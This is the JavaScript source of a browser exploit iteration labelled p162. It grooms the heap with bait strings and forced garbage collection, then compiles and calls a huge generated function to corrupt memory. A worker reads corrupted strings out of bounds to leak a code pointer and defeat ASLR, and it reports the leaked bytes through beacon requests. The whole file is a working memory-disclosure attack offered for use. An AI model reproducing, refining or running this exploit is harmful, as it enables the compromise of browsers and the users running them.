// p162 — EXACT p156 layout ('A' strings) + deep charCodeAt scan
//
// p156 proved: ALL 14 strings corrupted (.length=81400), charCodeAt(0-31) = 0x41
// PROBLEM: Only 32 bytes were scanned! Entry data starts ~60+ bytes into character data.
// FIX: Scan charCodeAt from 0 to 2000. Any non-0x41 byte = metadata entry data.
//   - entry+24 = m_slowPathCallDestination (8B code pointer) — our ASLR leak
//   - entry+64 = flags (2B), entry+68 = bytecodeIndex (4B)
//   - 108/112 entry bytes = 0x00
//
// Beacon prefix: V162-

(function() {
  var BASE = location.protocol + '//' + location.host;
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', BASE + '/beacon/V162-' + tag + '?t=' + Date.now(), true);
      x.send();
    } catch(e) {}
  }
  function hx(v) { return (v < 16 ? '0' : '') + v.toString(16); }

  B('BOOT');

  // ── WORKER (exact p156 pattern + deep scan) ──
  var workerCode = function() {
    var targets = [];
    var baseUrl = '';
    var STR_LEN = 100000;
    var CANARY = 0x41; // 'A'

    function beacon(tag) {
      try {
        var x = new XMLHttpRequest();
        x.open('GET', baseUrl + '/beacon/V162-W-' + tag + '?t=' + Date.now(), true);
        x.send();
      } catch(e) {}
    }
    function hx(v) { return (v < 16 ? '0' : '') + v.toString(16); }

    self.onmessage = function(e) {
      if (e.data.cmd === 'init') {
        baseUrl = e.data.baseUrl;
        beacon('ALIVE');
        return;
      }
      if (e.data.cmd === 'alloc') {
        // EXACT p156: 'A' filled strings
        var chunk = '';
        for (var k = 0; k < 100; k++) chunk += 'AAAAAAAAAA';
        for (var i = 0; i < 14; i++) {
          var s = '';
          for (var j = 0; j < STR_LEN; j += 1000) s += chunk;
          s = s.substring(0, STR_LEN);
          s.charCodeAt(0);
          targets.push(s);
        }
        beacon('TARGETS-' + targets.length);
        self.postMessage({ ready: true });
        return;
      }
      if (e.data.cmd === 'watch') {
        beacon('WATCHING');
        var found = false;
        var iters = 0;

        // FAST detection: .length ONLY (proven in p156)
        while (!found) {
          for (var i = 0; i < targets.length; i++) {
            if (targets[i].length !== STR_LEN) {
              beacon('LEN-' + i + '-' + targets[i].length);
              found = true;
              break;
            }
          }
          iters++;
          if (iters % 500000 === 0) beacon('POLL-' + iters);
        }

        // ── DEEP SCAN: find ALL non-0x41 bytes ──
        for (var i = 0; i < targets.length; i++) {
          var len = targets[i].length;
          if (len === STR_LEN) continue;

          beacon('S' + i + '-len=' + len);

          var maxScan = Math.min(len, 2000);
          if (maxScan <= 0) { beacon('S' + i + '-BAD'); continue; }

          // Scan every byte from 0 to 2000
          var nonCanary = [];
          for (var b = 0; b < maxScan; b++) {
            try {
              var ch = targets[i].charCodeAt(b);
              if (ch !== CANARY) {
                nonCanary.push({ off: b, val: ch });
              }
            } catch(e) { break; }
          }

          beacon('NC' + i + '-count=' + nonCanary.length);

          if (nonCanary.length > 0) {
            // Report first non-canary position (entry boundary)
            beacon('FIRST' + i + '-off=' + nonCanary[0].off + '-v=' + hx(nonCanary[0].val));

            // Report all non-canary positions (up to 40)
            var ncStr = '';
            for (var n = 0; n < Math.min(40, nonCanary.length); n++) {
              ncStr += nonCanary[n].off + ':' + hx(nonCanary[n].val) + ',';
            }
            // Split into 2 beacons if long
            beacon('NCA' + i + '-' + ncStr.substring(0, 200));
            if (ncStr.length > 200) beacon('NCB' + i + '-' + ncStr.substring(200, 400));

            // Find entry boundary: first contiguous run of non-0x41 bytes
            var entryBase = nonCanary[0].off;

            // Read 8 bytes at entryBase+24 (code pointer) as little-endian
            if (entryBase + 32 <= maxScan) {
              var ptrHex = '';
              for (var pb = 7; pb >= 0; pb--) {
                try { ptrHex += hx(targets[i].charCodeAt(entryBase + 24 + pb)); }
                catch(e) { ptrHex += 'XX'; }
              }
              beacon('CPTR' + i + '-' + ptrHex);
            }

            // Read 4 bytes at entryBase+68 (bytecodeIndex) as little-endian
            if (entryBase + 72 <= maxScan) {
              var bciHex = '';
              for (var bb = 3; bb >= 0; bb--) {
                try { bciHex += hx(targets[i].charCodeAt(entryBase + 68 + bb)); }
                catch(e) { bciHex += 'XX'; }
              }
              beacon('BCI' + i + '-' + bciHex);
            }

            // Dump raw 112 bytes from entry start
            if (entryBase + 112 <= maxScan) {
              var rawA = '';
              for (var rb = 0; rb < 56; rb++) {
                try { rawA += hx(targets[i].charCodeAt(entryBase + rb)); }
                catch(e) { rawA += 'XX'; break; }
              }
              beacon('RA' + i + '-' + rawA);
              var rawB = '';
              for (var rb = 56; rb < 112; rb++) {
                try { rawB += hx(targets[i].charCodeAt(entryBase + rb)); }
                catch(e) { rawB += 'XX'; break; }
              }
              beacon('RB' + i + '-' + rawB);
            }

            // Second entry at +112 for comparison
            if (entryBase + 224 <= maxScan) {
              var ptr2 = '';
              for (var pb = 7; pb >= 0; pb--) {
                try { ptr2 += hx(targets[i].charCodeAt(entryBase + 112 + 24 + pb)); }
                catch(e) { ptr2 += 'XX'; }
              }
              beacon('CPTR' + i + 'b-' + ptr2);
              var bci2 = '';
              for (var bb = 3; bb >= 0; bb--) {
                try { bci2 += hx(targets[i].charCodeAt(entryBase + 112 + 68 + bb)); }
                catch(e) { bci2 += 'XX'; }
              }
              beacon('BCI' + i + 'b-' + bci2);
            }
          } else {
            // All 0x41 in first 2000 bytes — try deeper
            beacon('ALLCANARY' + i);
            // Scan at wider intervals
            var deepHit = -1;
            for (var b = 2000; b < Math.min(len, 50000); b++) {
              try {
                if (targets[i].charCodeAt(b) !== CANARY) {
                  deepHit = b;
                  break;
                }
              } catch(e) { break; }
            }
            if (deepHit >= 0) {
              beacon('DHIT' + i + '-' + deepHit + '-v=' + hx(targets[i].charCodeAt(deepHit)));
            } else {
              beacon('NOENTRY' + i);
            }
          }

          // Process first 3 corrupted strings only
          if (i >= 2) break;
        }
        beacon('DONE');
      }
    };
  };

  var workerBlob = new Blob(
    ['(' + workerCode.toString() + ')()'],
    { type: 'application/javascript' }
  );
  var worker = new Worker(URL.createObjectURL(workerBlob));
  worker.postMessage({ cmd: 'init', baseUrl: BASE });

  // ── PHASE 1: BAIT STRINGS — EXACTLY p156 ──
  var N_BAIT = 20;
  var STR_LEN = 100000;
  B('BAIT-START');
  var baits = [];
  var baitChunk = '';
  for (var k = 0; k < 100; k++) baitChunk += 'BBBBBBBBBB';
  for (var i = 0; i < N_BAIT; i++) {
    var bait = '';
    for (var j = 0; j < STR_LEN; j += 1000) bait += baitChunk;
    bait = bait.substring(0, STR_LEN);
    bait.charCodeAt(0);
    baits.push(bait);
  }
  baitChunk = null;
  B('BAIT-DONE-' + N_BAIT);

  // ── PHASE 2: WORKER ALLOCATES TARGETS ──
  worker.onmessage = function(e) {
    if (e.data.ready) phaseFreeBaits();
  };
  B('WORKER-ALLOC');
  worker.postMessage({ cmd: 'alloc' });

  // ── PHASE 3: FREE BAITS + GC ──
  function phaseFreeBaits() {
    B('FREE-START');
    for (var i = 0; i < baits.length; i++) baits[i] = null;
    baits = null;

    var gcRound = 0;
    function gcPressureRound() {
      for (var j = 0; j < 1000; j++) new ArrayBuffer(8192);
      for (var j = 0; j < 500; j++) new Array(100).fill(gcRound);
      gcRound++;
      if (gcRound < 30) setTimeout(gcPressureRound, 30);
      else { B('GC-DONE-' + gcRound); phaseBuild(); }
    }
    gcPressureRound();
  }

  // ── PHASE 4: BUILD + CALL ──
  function phaseBuild() {
    B('BUILD-START');
    var N = 38348816;
    var CHUNK = 4000000;
    var CHUNKS = Math.floor(N / CHUNK);
    var REM = N - CHUNKS * CHUNK;

    var callChunk = '';
    for (var c = 0; c < CHUNK; c++) callChunk += 'a();';
    var remChunk = '';
    for (var r = 0; r < REM; r++) remChunk += 'a();';

    var parts = ['window.__v162fn=function(a){'];
    for (var ch = 0; ch < CHUNKS; ch++) parts.push(callChunk);
    parts.push(remChunk);
    parts.push('};window.__v162ok=true;');

    var blob = new Blob(parts, { type: 'application/javascript' });
    B('BLOB-' + (blob.size / 1024 / 1024).toFixed(0) + 'MB');
    callChunk = null;
    remChunk = null;
    parts = null;

    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');

    sc.onload = function() {
      B('COMPILED-' + (window.__v162ok ? 'OK' : 'FAIL'));
      if (!window.__v162fn) { B('NO-FN'); return; }

      worker.postMessage({ cmd: 'watch' });

      setTimeout(function() {
        B('CALLING');
        try {
          window.__v162fn(function(){});
        } catch(ex) {
          B('CATCH-' + (ex.message || '').substring(0, 30));
        }
        B('SURVIVED');
      }, 200);
    };

    sc.onerror = function() { B('SCRIPT-ERR'); };
    document.head.appendChild(sc);
    sc.src = url;
  }
})();
